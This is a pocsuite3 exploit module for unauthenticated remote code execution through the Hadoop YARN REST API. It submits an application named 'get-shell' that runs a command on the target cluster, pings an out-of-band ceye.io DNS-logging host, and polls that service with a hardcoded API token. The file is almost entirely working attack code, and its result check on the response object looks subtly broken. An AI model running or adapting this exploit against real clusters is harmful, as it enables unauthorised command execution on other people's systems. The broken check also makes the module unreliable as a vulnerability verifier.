#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from pocsuite3.lib.utils import random_str


class Hadoop(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-14'
    updateDate = '2019-11-14'
    references = ['']
    name = 'Hadoop Yarn REST API Remote Code Execution'
    appPowerLink = ''
    appName = 'Hadoop'
    appVersion = 'all'
    vulType = 'rce'
    desc = ''' 
    Hadoop Yarn REST API Remote Code Execution
    '''

    def _verify(self):
        result = {}
        payload = random_str(16) + '.6eb4yw.ceye.io'
        cmd = 'ping ' + payload
        try:
            if self.url[-1] == '/':
                url1 = self.url + 'ws/v1/cluster/apps/new-application'
                url2 = self.url + 'ws/v1/cluster/apps'
            else:
                url1 = self.url + '/' + 'ws/v1/cluster/apps/new-application'
                url2 = self.url + '/' + 'ws/v1/cluster/apps'
            resp = requests.post(url=url1)
            app_id = resp.json()['application-id']
            data = {
                'application-id': app_id,
                'application-name': 'get-shell',
                'am-container-spec': {
                    'commands': {
                        'command': '%s' % cmd,
                    },
                },
                'application-type': 'YARN',
            }
            attack = requests.post(
                url=url2,
                json=data
            )
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if payload in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Hadoop)